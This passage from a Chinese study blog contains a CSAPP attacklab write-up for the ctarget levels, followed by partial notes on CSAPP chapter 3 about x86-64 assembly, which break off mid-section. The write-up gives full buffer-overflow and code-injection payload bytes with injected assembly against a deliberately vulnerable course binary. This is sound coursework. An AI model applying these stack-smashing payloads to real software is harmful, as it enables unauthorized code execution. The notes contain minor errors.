title="attaklab"></a>attaklab</h1><p>是书中的第三个实验，但是感觉实验内容和第三章的内容没什么关系</p><p>一共是两个文件，一个是 <code>ctarget</code>，一个是 <code>rtarget</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-%E8%AF%95%E8%BF%90%E8%A1%8C.png"></p><p>其中 ctarget 是存在代码注入攻击漏洞，rtarget是存在面向返回的编程（ROP）攻击漏洞。</p><p><code>hex2raw</code> 是题目为我们提供的把十六进制表示转换为二进制数据的工具（超级简易版 pwntools !)，确定好要给<code>ctarget</code> 输入的信息，用 <code>hex2raw</code> 转换，通过 Linux 终端的 IO 重定向功能，就可以输入给进程。</p><p>我只做了 ctarget。</p><blockquote><p>gdb 调不了这个文件不知道为啥，就 objdump -d ctarget &gt; ctarget.s 了汇编文件</p></blockquote><h3 id="touch1"><a href="#touch1" class="headerlink" title="touch1"></a>touch1</h3><blockquote><p>任务描述：当函数 getbuf 返回后，让 ctarget 执行函数 touch1 ，而不是继续执行函数 test 。</p></blockquote><p>最开始就让输入一串字符串，目的是覆盖返回地址，使程序跳转到 <code>touch1</code></p><p>真的很怪这个程序的开始部分不在 main 函数里，所在函数叫 <code>getbuf</code>，被很多层的嵌套在了 <code>launch</code> 函数里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004017a8 &lt;getbuf&gt;:<br>  4017a8:48 83 ec 28          sub    $0x28,%rsp<br>  4017ac:48 89 e7             mov    %rsp,%rdi<br>  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;<br>  4017b4:b8 01 00 00 00       mov    $0x1,%eax<br>  4017b9:48 83 c4 28          add    $0x28,%rsp<br>  4017bd:c3                   retq   <br>  4017be:90                   nop<br>  4017bf:90                   nop<br></code></pre></td></tr></table></figure><p>第一个<code>sub</code>指令把栈顶往下挪了40字节，也就是给缓冲区分配了40字节，然后调用了<code>Gets</code>，<code>Gets</code> 接收用户输入字符串。</p><p>所以，我们需要填充 (0x28+8) 个字符，再填充 <code>touch1</code> 的地址 0x04017c0 覆盖返回地址。 <code>hex2raw</code>  接受十六进制的数据，再加上小端序处理信息，所以我们要喂给  <code>hex2raw</code>  的数据是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hex">11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40 <br></code></pre></td></tr></table></figure><p>得出结果再丢给ctarget就行辣！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim touch1.txt<br>$ ./hex2raw &lt; touch1.txt &gt; touch1<br>$ ./ctarget -q -i ./touch1<br>Cookie: 0x59b997fa<br>Touch1!: You called touch1()<br>Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget<br>PASS: Would have posted the following:<br>user <span class="hljs-built_in">id</span>bovik<br>course15213-f15<br>labattacklab<br>result1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40 <br></code></pre></td></tr></table></figure><h3 id="touch2"><a href="#touch2" class="headerlink" title="touch2"></a>touch2</h3><blockquote><p>任务描述：当函数 getbuf 返回后，让 ctarget 执行函数 touch2 ，而不是继续执行函数 test 。</p></blockquote><p>还是和 <code>touch1</code> 一样覆盖返回地址，但是这次还要传递一个参数，下面是 <code>touch2</code> 的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004017ec &lt;touch2&gt;:<br>  4017ec:48 83 ec 08          sub    $0x8,%rsp<br>  4017f0:89 fa                mov    %edi,%edx<br>  4017f2:c7 05 e0 2c 20 00 02 movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;<br>  4017f9:00 00 00 <br>  4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;<br>  401802:75 20                jne    401824 &lt;touch2+0x38&gt;<br>  401804:be e8 30 40 00       mov    $0x4030e8,%esi<br>  401809:bf 01 00 00 00       mov    $0x1,%edi<br>  40180e:b8 00 00 00 00       mov    $0x0,%eax<br>  401813:e8 d8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;<br>  401818:bf 02 00 00 00       mov    $0x2,%edi<br>  40181d:e8 6b 04 00 00       callq  401c8d &lt;validate&gt;<br>  401822:eb 1e                jmp    401842 &lt;touch2+0x56&gt;<br>  401824:be 10 31 40 00       mov    $0x403110,%esi<br>  401829:bf 01 00 00 00       mov    $0x1,%edi<br>  40182e:b8 00 00 00 00       mov    $0x0,%eax<br>  401833:e8 b8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;<br>  401838:bf 02 00 00 00       mov    $0x2,%edi<br>  40183d:e8 0d 05 00 00       callq  401d4f &lt;fail&gt;<br>  401842:bf 00 00 00 00       mov    $0x0,%edi<br>  401847:e8 f4 f5 ff ff       callq  400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure><blockquote><p>我真的看汇编头晕我丢给 ida 了</p></blockquote><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch2.png"></p><p>检查条件是 <code>val = cookie</code> ，cookie 每次都是一样的 <code>0x59b997fa</code>。我们要把这个值传给 val，可以用命令 <code>movq 0x59b997fa,%rdi</code> 实现。</p><blockquote><p>第一个参数用 rdi 传递</p></blockquote><p>如此，我们就可以在 getbuf 时填入该语句，再将返回地址改写成 touch2 的地址，这样一来再次跳转执行 <code>ret</code> ，就可以执行我们写入的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq 0x59b997fa,%rdi<br>pushq 0x04017ec<br>retq<br></code></pre></td></tr></table></figure><p>最后获得的字节序列是 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hex">48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 00 00<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch2%E7%BB%93%E6%9E%9C.png"></p><h3 id="touch3"><a href="#touch3" class="headerlink" title="touch3"></a>touch3</h3><blockquote><p>任务描述：当函数 getbuf 返回后，让 ctarget 执行函数 touch3 ，而不是继续执行函数 test 。</p></blockquote><p>同样还是从 test 跳转到 <code>touch3</code>，这次是调用了一个函数 <code>hexmatch()</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch3.png"></p><p> <code>hexmatch()</code> 必须为 true 才能成功</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-hexmatch.png"></p><p>就是要对比 sval 和 转化成字符串后的 cookie ，让它们俩相等。可以使用 <code>man ascii</code> 命令，得到字符串59b997fa 的十六进制表示：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">59b997fa</span> =&gt; <span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p>在C语言中字符串需要在末尾补上结束符<code>&#39;\0&#39;</code>，其对应的十六进制形式为<code>0x00</code>。因此，字符串的完整表示为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>由于此处 v2 为指针指向某处地址，我们要将 rdi 地址设置为字符串的地址。此时我们需要考虑把字符串存储在哪里，由于函数 hexmatch 和 strncmp 被调用时，getbuf 使用的缓冲区会被重写。因此，不能将字符串存放在getbuf 的缓冲区中。可以把其存放在 test 的栈帧中。</p><p>getbuf的栈顶地址为<code>0x5561dc78</code>，getbuf 的缓冲区在栈中占了40个字节，随后其返回地址又占了8个字节，共计48&#x3D;0x30个字节。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x5561dc78</span> + <span class="hljs-number">0</span>x30 = <span class="hljs-number">0</span>x5561dca8<br></code></pre></td></tr></table></figure><p>因此，可以将 cookie 值存放在地址 <code>0x5561dca8</code> 中。</p><p>注入的汇编代码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov $0x5561dca8, %rdi<br>push $0x4018fa        <br>ret                  <br></code></pre></td></tr></table></figure><p>最终的攻击字符串为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hex">48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-touch3%E7%BB%93%E6%9E%9C.png"></p><hr><p>原来这个实验我做了三天😶‍🌫️果然假期就是懒惰</p><p>xsbb:</p><p>在 phase_3 的跳转表那里，其实我当时根本没看出来这是跳转表，我去问了 chatCPT😿</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct_chat.png"></p><hr><p>编辑记录：</p><ul><li><p>2023-10-03 bomblab</p></li><li><p>2023-11-20 attacklab</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPPlab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第三章 程序的机器级表示 总结</title>
    <link href="/2023/09/30/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/"/>
    <url>/2023/09/30/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<p>C语言指令对应的机器表示</p><span id="more"></span><h3 id="历史观点"><a href="#历史观点" class="headerlink" title="历史观点"></a>历史观点</h3><p>Inter 处理器系列俗称 x86，它经历了一个长期的、不断进化的过程。几十年来，实现了从 16 位到 32 位 i386，最后到现在 64 位的 x86-64 处理器，其中每个后继处理器都是向后兼容的——较早版本的处理器上编译的代码总是可以在较新的处理器上运行。</p><h5 id="摩尔定律"><a href="#摩尔定律" class="headerlink" title="摩尔定律"></a>摩尔定律</h5><p>1965年，Gordon Mone （Intel 公司的创始人）推断，在未来的十年，芯片上的晶体管数量每年都会翻一番，这个预测就是摩尔定律。事实证明这个预测是正确的。</p><blockquote><p>还以为是摩尔庄园那个摩尔（x</p></blockquote><h3 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h3><p>假设C程序 Hello.c 文件，我们在 linux 系统中用下面的命令编译代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">gcc -g Hello.c -o Hello</span><br></code></pre></td></tr></table></figure><blockquote><p>gcc（GCC）是 Linux 的默认编译器</p></blockquote><p>用户看来是执行了一条命令，但是实际上机器执行了一系列的程序，才将源代码转换成可执行代码。有以下几个流程，我们也可以用不同的命令控制 GCC 逐步执行：</p><ul><li><p>预处理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -E Hello.c -o Hello.i</span><br></code></pre></td></tr></table></figure><p>C预处理器拓展源代码，插入所有 #include 命令指定的文件，并拓展所有以 #define 声明指定的宏。</p></li><li><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -S Hello.i -o Hello.s</span><br></code></pre></td></tr></table></figure><p>编译器会产生汇编代码文件 <code>Hello.s</code>。</p></li><li><p>汇编</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -c test.s -o test.o</span><br></code></pre></td></tr></table></figure><p>汇编器会将汇编代码转化成二进制目标代码文件 <code>Hello.o</code> 。其中，目标代码是汇编代码的一种形式，它包含所有指令的二进制表示，但是没有填入全局值的地址。</p></li><li><p>链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">gcc -g test.o -o <span class="hljs-built_in">test</span> [--static]</span><br></code></pre></td></tr></table></figure><p>连接器将目标代码文件与实现库函数（例如 printf ）的代码合并，并产生最终的可执行代码文件。其中，我们可以在队后一步编译的时候添加 <code>static</code> 参数进行静态链接，不参加参数就是默认动态链接。</p></li></ul><p>对于机器级编程来说，有两种抽象尤为重要：</p><ul><li>由指令集体系结构或指令集架构（ISA）定义的机器及程序的格式和行为。</li><li>内存地址实际上是虚拟地址</li></ul><p>在C语言中，我们声明和分配各种数据类型的对象，但是机器代码不区分这些数据，只是将内存看作一个很大的、按字节寻址的数组。不区分各种类型的数据，数组和结构也只使用一组连续的字节来表示。</p><p>X86-64 的机器代码和原始的C语言代码差别很大，对于程序员来说是有很多的隐藏状态，例如：</p><ul><li>程序计数器（通常称为 PC ，在 x86-64 中用 <code>%rip</code> 表示）用于指示程序要执行的下一条指令在内存中的地址</li><li>整数寄存器文件，用于存储地址（对应C语言的指针）或整数数据。</li><li>条件码寄存器，保存着最近执行的算术逻辑或逻辑指令的状态信息</li><li>向量寄存器，存放一个或多个整数或浮点数值</li></ul><blockquote><p>我们经常接触到的汇编语言，其实并不是机器语言。但是汇编代码表示非常接近机器代码，由于汇编代码对于程序员来讲更具有可读性，所以我们经常用汇编代码来学习和解释机器代码行为</p></blockquote><p>程序内存这些都是由虚拟内存来寻址的，操作系统负责管理虚拟内存空间，把<strong>虚拟地址转换为实际物理地址</strong>。</p><p>前面有提到，程序的汇编指令转化为计算机可读的文件二进制目标代码后就变成了一个01的字节序列，机器也只是执行这个字节序列，机器对指令的源代码一无所知。</p><p>当然我们可以利用下面的命令反编译可重定向文件或者是可执行 ELF 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">objdump -d filename.o</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">objdump -d filename</span><br></code></pre></td></tr></table></figure><p>我们也可以使用 <code>hexdump -x  filename.o</code> 命令输出二进制文件的十六进制表示形式（虽然没有什么可读性上的帮助 <del>xsbb</del>）</p><blockquote><p>objdump 、hexdump 命令还有不同参数对应不同功能 </p></blockquote><p>机器代码的特性：</p><ul><li><p>指令可以从任意内存地址开始，CPU不会强制进行代码对齐</p></li><li><p>指令长度从1字节到15字节不等。常用指令的字节数少，越不常用字节数越多</p></li><li><p>从给定的某一位置开始，每一个机器字节都对应唯一的指令</p></li><li><p>反汇编器只是根据字节序列确定汇编代码，它不需要访问编译出该程序的源文件</p></li></ul><p>如果我们直接 <code>cat filename.s</code>，输出的汇编代码如下图所示：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E6%9F%A5%E7%9C%8B%E6%B1%87%E7%BC%96%E6%96%87%E4%BB%B6.png"></p><p>其中以 <code>.</code> 开头的都是知道汇编器和编译器的伪指令，我们可以忽略。我们在表示汇编代码时会省略这些伪指令，同时，汇编代码的格式也有不同，分为 AT&amp;T 和 Inter 两种风格：</p><blockquote><p>gcc 默认输出的是 AT&amp;T ，微软系列都是 Inter</p></blockquote><table><thead><tr><th></th><th>Inter</th><th>AT&amp;T</th></tr></thead><tbody><tr><td>指令后缀</td><td>无后缀，例如：mov、push</td><td>有指示大小的后缀，例如：pushq、movq</td></tr><tr><td>寄存器</td><td>寄存器无 % 符号，例如：rbx</td><td>寄存器有 % 符号，例如：%rbx</td></tr><tr><td>立即数</td><td>有任何前缀，直接用一个数字表示</td><td>用 $ 前缀表示一个立即数</td></tr><tr><td>操作数顺序</td><td>操作符 目的操作数 , 源操作数 例如：mov eax,1</td><td>操作符 源操作数 , 目的操作数  例如：mov $1,%eax</td></tr><tr><td>内存取址</td><td>section:[base + index*scale + disp]</td><td>section:disp(base, index, scale)</td></tr></tbody></table><blockquote><p>其中base和index必须是寄存器，disp和scale可以是常数</p><p>计算方法 :  disp + base + index * scale</p><p>最终地址 &#x3D; 地址或偏移 + %基址或偏移量寄存器 + %索引寄存器 * 比例因子</p></blockquote><h3 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h3><p>由于 Intel 是从 6 位体系拓展成 64 位的，所以用术语 “字(word)” 表示 16 位的数据类型，因此 32 位数被称为 “双字(double words)”，同理 64 位数被称为 “四字(quad words)”。</p><p>指针在不同位数系统中的大小不同，在多少的系统里面就是多少，64位系统中就对应存储为 8 字节的四字。</p><p>下面是常见的数据类型的大小：</p><table><thead><tr><th align="center">C声明</th><th align="center">Intel数据类型</th><th align="center">汇编代码后缀</th><th align="center">大小（字节）</th></tr></thead><tbody><tr><td align="center">char</td><td align="center">字节</td><td align="center">b</td><td align="center">1</td></tr><tr><td align="center">short</td><td align="center">字</td><td align="center">w</td><td align="center">2</td></tr><tr><td align="center">int</td><td align="center">双字</td><td align="center">l</td><td align="center">4</td></tr><tr><td align="center">long</td><td align="center">四字</td><td align="center">q</td><td align="center">8</td></tr><tr><td align="center">char *</td><td align="center">四字</td><td align="center">q</td><td align="center">8</td></tr><tr><td align="center">float</td><td align="center">单精度</td><td align="center">s</td><td align="center">4</td></tr><tr><td align="center">double</td><td align="center">双精度</td><td align="center">l</td><td align="center">8</td></tr></tbody></table><p>需要注意的是，虽然4字节的整数和双精度浮点数都是用 l 来表示，但是不会产生歧义，因为两种数据类型使用的是完全不同的两组指令和寄存器。</p><h3 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h3><p>寄存器用来存储数据和指针，最初的16位系统中有八个16位的寄存器，分别是 ax , bx , cx , dx , d i, si , sp , bp 。后来发展到 32 位，寄存器也拓展成 32 位，在原本寄存器名字的前面加上 <code>e</code> 来表示，如 eax 。现在的 x86-64 中，寄存器对应拓展为 64 位，把所有的 <code>e</code> 替换成了 <code>r</code>，并且新增了 8 个寄存器 r8~r15。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E5%AF%84%E5%AD%98%E5%99%A8.png"></p><h4 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h4><p>大多数的指令都有一个或多个操作数，指示出执行一个操作中要使用的源数据值以及放置结果的目的位置。操作数可以是立即数、寄存器或者内存引用。</p><p>其中，内存引用会根据计算出的有效地址去访问内存位置。同时，有许多种寻址模式，允许不同形式的内存引用。书上也给出了很多寻址模式的解析：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F.png"></p><p>我们最常用的寻址方式是图上的最后一个，是<strong>比例变址寻址</strong>的一种，表示为 <code>Imm(x,y,z)</code>，表示了地址为 <code>x+yz+Imm</code> 的内存空间。</p><h4 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h4><p>数据传送指令，就是字面意思，把数据从一个位置复制到另一个位置的指令。</p><p>我们把对应执行操作相同，但是执行的操作数大小不同的不同指令称之为同一个<strong>指令类</strong>。</p><p>MOV 类指令是最简单的数据传送指令，在实际应用中也最为频繁。这类指令把数据从原位置复制到目的位置，不对数据做任何的处理和改变。</p><p>这类指令有两个操作数，源操作数存储在寄存器或内存中的立即数 ，而目的操作数指定一个位置，它是寄存器或者一个内存地址。需要注意的是，<strong>传送指令的两个操作数不能同时指向内存位置</strong>。</p><p>MOV 类由 <code>movb</code>、<code>movw</code>、<code>movl</code>、<code>movq</code> 四个指令组成，它们之间的差异是<strong>操作数据大小不同</strong>，分别对应 1 字节、2 字节、4 字节和 8 字节，操作数中的寄存器部分必须和指令最后一个字符对应。这其中传输双字的指令 <strong>movl ，如果目的操作数是一个寄存器，那么它会把寄存器的高位 4 字节全部置零</strong>。</p><p>有的时候目的寄存器和源寄存器的字长并不是对应的，可能会出现目的寄存器的字长大于源寄存器的情况，这个时候就会对源操作数进行拓展。这样又对应有两种拓展方式：零拓展（MOVZ 类）和符号拓展（MOVS类）。</p><p>指令名称中的后两个字符都是大小指示符，第一个字符指定源的大小（字节b，字w，双字l），第二个就是目的大小（字w，双字l，四字q）。具体如下表：</p><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>movzbw</td><td>将做了零拓展的字节传送到字</td></tr><tr><td>movzbl</td><td>将做了零拓展的字节传送到双字</td></tr><tr><td>movzwl</td><td>将做了零拓展的字传送到双字</td></tr><tr><td>movzbq</td><td>将做了零拓展的字节传送到四字</td></tr><tr><td>movzwq</td><td>将做了零拓展的字传送到四字</td></tr><tr><td>movsbw</td><td>将做了符号拓展的字节传送到字</td></tr><tr><td>movsbl</td><td>将做了符号拓展的字节传送到双字</td></tr><tr><td>movswl</td><td>将做了符号拓展的字传送到双字</td></tr><tr><td>movsbq</td><td>将做了符号拓展的字节传送到四字</td></tr><tr><td>movswq</td><td>将做了符号拓展的字传送到四字</td></tr><tr><td>movslq</td><td>将做了符号拓展的双字传送到四字</td></tr><tr><td>cltq</td><td>把 %eax 符号拓展到 %rax ，等效于 movslq %eax, %rax</td></tr></tbody></table><p>零拓展是用 0 填充目的中的剩余字节，符号拓展就是用最高位符号位填充剩余字节。</p><h4 id="压入和弹出栈数据"><a href="#压入和弹出栈数据" class="headerlink" title="压入和弹出栈数据"></a>压入和弹出栈数据</h4><p>压栈和入栈实际上也是数据传送的操作，只不过操作的对象是栈。<code>pushq(push)</code>的功能是把数据压入栈，<code>popq(pop)</code> 的功能是弹出数据。这两个指令都只有一个操作数——压入的数据源和弹出的数据目的。</p><p>push 的作用是将栈指针减 8 也就是抬高栈顶，再将操作数写入开辟出来的栈空间中；pop 正好相反，先将栈顶的8 字节数据传送到操作数当中，再将栈指针加 8。</p><p>需要注意的是，因为不能同时交换两个内存地址，所以 <strong>push 的源操作数只能是立即数或者是寄存器， pop 的目的操作数只能是寄存器</strong>。</p><h4 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h4><p>之前在第二章中学到过计算机的运算，主要分为算数运算和逻辑运算。</p><p>这些运算操作又被分成四组：加载有效地址、一元操作、二元操作和移位。一元操作就是只有一个操作数，同样的，二元操作就是有两个操作数。在这之下，每一个运算的指令类都有对应的不同大小操作数的变种。</p><p>具体如下表：</p><blockquote><p>一元操作指令</p></blockquote><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>INC D</td><td>自增（D++）</td></tr><tr><td>DEC D</td><td>自减（D–）</td></tr><tr><td>NEG D</td><td>取负（-D）</td></tr><tr><td>NOT D</td><td>取反（~D）</td></tr></tbody></table><blockquote><p>二元操作指令</p></blockquote><table><thead><tr><th>指令</th><th>描述</th></tr></thead><tbody><tr><td>ADD S, D</td><td>D+ &#x3D; S</td></tr><tr><td>SUB S, D</td><td>D- &#x3D; S</td></tr><tr><td>IMUL S, D</td><td>D* &#x3D; S（有符号）</td></tr><tr><td>MUL S, D</td><td>D* &#x3D; S（无符号）</td></tr><tr><td>IDIV S, D</td><td>D&#x2F; &#x3D; S（有符号）</td></tr><tr><td>DIV S, D</td><td>D&#x2F; &#x3D; S（无符号）</td></tr><tr><td>XOR S, D</td><td>D^ &#x3D; S</td></tr><tr><td>OR S, D</td><td>D| &#x3D; S</td></tr><tr><td>AND S, D</td><td>D&amp; &#x3D; S</td></tr><tr><td>SAL S, D</td><td>D&lt;&lt; &#x3D; S（有符号）</td></tr><tr><td>SAR S, D</td><td>算术右移  D&gt;&gt; &#x3D; S（有符号）</td></tr><tr><td>SHL S, D</td><td>D&lt;&lt; &#x3D; S（无符号）</td></tr><tr><td>SHR S, D</td><td>逻辑右移  D&gt;&gt; &#x3D; S（无符号）</td></tr></tbody></table><h4 id="加载有效地址"><a href="#加载有效地址" class="headerlink" title="加载有效地址"></a>加载有效地址</h4><p><code>leaq(lea)</code> 指令是加载有效地址指令，它实际上就是 movq 的变形。</p><p><code>lea</code> 指令形式是从内存读取数据到寄存器，但实际上它根本既没有引用内存。它的第一个操作数看上去是个内存引用，但该指令并不是从指定的位置读入数据，而是<strong>将有效地址写入目的操作数</strong>。此外，lea 的目的操作数必须是寄存器。</p><p><code>lea</code> 指令有很多灵活的用法，经常用于计算数据，可以实现加法和有限形式的乘法，如下面的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">example</span><span class="hljs-params">(<span class="hljs-type">long</span> x,<span class="hljs-type">long</span> y)</span><br>&#123;<br>    <span class="hljs-comment">//x in %rdi,y in %rsi</span><br>    <span class="hljs-type">long</span> t=x+<span class="hljs-number">4</span>*y;<br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果没有 <code>lea</code> 指令，这个函数对应的计算部分的汇编代码可以被写成这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq    %rsi, %rax      # 将y（%rsi）移动到%rax寄存器<br>salq    $2, %rax        # 乘以4（左移2位，相当于乘以4）<br>addq    %rdi, %rax      # 将%rdi添加到%rax<br></code></pre></td></tr></table></figure><p>但我们引用 lea ，汇编代码就被简化了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leaq (%rdi,4,%rsi),%rax<br></code></pre></td></tr></table></figure><blockquote><p>没错就这一句🤔</p></blockquote><h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><p>程序中不止会有逐步指令执行的直线代码行为，C语言中的某些结构会要求有条件的执行，比如循环语句，在循环中我们会重复执行多次统一部分的指令。对此，机器提供相应的指令来控制修改机器代码的指令顺序。</p><p>执行方式分为条件执行和非条件执行</p><h4 id="条件码"><a href="#条件码" class="headerlink" 